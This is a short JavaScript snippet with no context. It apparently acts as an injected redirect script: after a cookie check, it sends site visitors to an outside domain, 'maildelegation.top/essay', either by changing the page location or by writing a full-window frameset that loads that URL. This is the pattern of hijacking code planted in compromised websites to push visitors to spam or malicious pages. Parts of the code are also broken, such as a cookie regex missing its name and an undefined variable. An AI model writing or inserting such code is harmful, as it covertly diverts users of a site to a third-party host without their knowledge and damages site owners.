(function() {
    var s = "http://maildelegation.top/essay?keyword=" + q;
    var r = 1;
    if(checkCookie("c"))
    {
        document["cookie"] = "c=; expires=Thu, 01 Jan 1970 00:00:01 GMT;";
        if(checkCookie("c") == "")
        {
            if(r)
                document["location"]["href"] = s;
            else
                document["write"]('<frameset rows="*,0" framespacing="0" border="0" frameborder="no"><frame src="'+s+'" noresize="" scrolling="auto"></frameset>');
        }
    }
    function checkCookie(result)
    {
        return(result = document["cookie"]["match"](/(?:^|; )=([^;]*)/)) ? decodeURIComponent(result[1]) : "";
    }
})();